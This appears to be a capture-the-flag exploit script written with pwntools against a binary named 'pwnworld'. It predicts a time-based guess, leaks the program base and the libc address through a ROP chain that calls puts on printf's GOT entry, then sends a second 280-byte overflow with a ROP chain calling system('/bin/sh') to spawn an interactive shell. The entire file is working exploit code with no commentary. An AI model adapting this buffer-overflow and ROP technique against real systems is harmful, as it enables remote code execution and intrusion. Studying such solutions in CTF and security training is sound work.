from pwn import *
binary = './pwnworld_patched'
#r = remote('ctf-gemastik.ub.ac.id',10012)
r = process(binary)
p = process('./a.out')
elf = context.binary = ELF(binary)
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('./libc.so.6')
time = p.recvline()
time = time.strip().split(b' ')[2]
r.sendline(time)
r.recvuntil(b'to you: ')

leak = r.recvline().strip()
base_addr = int(leak,16) - 0x404c
elf.address = base_addr

print(hex(base_addr))

#0x00000000000012b5 : pop rdi ; ret
pop_rdi = base_addr + 0x00000000000012b5
#0x000000000000101a : ret
ret = base_addr + 0x000000000000101a


payload = b"a"*280
payload += p64(pop_rdi)
payload += p64(elf.sym['got.printf'])
payload += p64(elf.sym['plt.puts'])
payload += p64(elf.sym['main'])

r.recv()
r.sendline(payload)
r.recvline()
#leak = r.recvline()
leak = u64(r.recvline().strip().ljust(8,b'\x00'))
#print(leak)
libc.address  = leak - libc.sym['printf']
print(hex(libc.address))
bin_sh = p64(next(libc.search(b'/bin/sh')))
system = libc.address + 0x4ebf0


payload = b"a"*280
payload += p64(pop_rdi)
payload += bin_sh
payload += p64(ret)
payload += p64(system)


p = process('./a.out')
time = p.recvline()
time = time.strip().split(b' ')[2]


r.recvuntil(b"guess? ")
r.sendline(time)

r.sendline(payload)
r.interactive()